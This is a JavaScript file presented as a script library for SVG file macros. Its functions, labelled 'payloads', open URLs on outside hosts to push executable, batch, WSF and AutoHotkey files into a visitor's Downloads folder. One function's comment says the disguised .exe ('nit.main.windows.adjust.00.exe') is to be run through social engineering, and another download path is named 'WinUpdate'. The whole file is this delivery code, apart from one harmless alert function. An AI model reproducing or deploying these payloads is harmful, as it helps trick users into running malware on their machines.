/**********************************************************
 * lib-1.0.0-svg.js
 * Scripts Library for SVG files macros
 *
**********************************************************/

// The Payloads

/**********************************************************
 * FishDownload00()
 * This function will Download a file
 * to Execute it by the SE Methods.
 * 
 * The file will downloads to the User's Downloads
 * Folder with Requiest at morden browsers.
 */
function FishDownload00() {

    // Define Variables
    //
    var anExeFile0 = "nit.main.windows.adjust.00.exe";
    var anExeFile1 = "nit.main.windows.adjust.01.exe";
    // Define a Site URL
    var aPureURL = "http://lin.netip4.ru:18080/~vagrant/PROGS/LIB-RUN/PS1/";
    var anURL=aPureURL + "download.php?file=" + anExeFile0;

    // Run Payloads
    window.open( anURL);
}

/**********************************************************
 * ScriptAlert00()
 * This function will Show a Script Alert
 */
function ScriptAlert00(){

    // Define a Variable
    var aMessage;
    aMessage = "This is an Alert from the SVG Script.\n\nHello!";

    // Run Payload
    alert(aMessage);
    return;
}

/**********************************************************
 * Test_Download_Echo_Files()
 * This function will Downloads echo Files.
 * 
 * The file will downloads to the User's Downloads
 * Folder with Requiest at morden browsers.
 */
function Test_Download_Echo_Files(params) {
    var cmdEcho, exeEcho, wsfEcho, ahkEcho;
    var strURLPath, strURLPath1;
    var anURL;

    // Set Variables
    strURLPath = "http://win.netip4.ru/Scripts/LIB-TEST/";
    strURLPath1 = "http://file.netip4.ru/WinUpdate/InitialCommon/";
    cmdEcho = "echo.bat";
    exeEcho = "HelloWorld01.exe";
    wsfEcho = "echo.wsf";
    ahkEcho = "HelloWorld.ahk";

    // Set an URL and Run Payloads
    anURL = strURLPath1 + "download.php?file=" + ahkEcho;
    window.open( anURL);

    anURL = strURLPath +  "download.php?file=" + wsfEcho;
    window.open( anURL);

    anURL = strURLPath +  "download.php?file=" + exeEcho;
    window.open( anURL);

    anURL = strURLPath +  "download.php?file=" + cmdEcho;
    window.open( anURL);
    return;
}
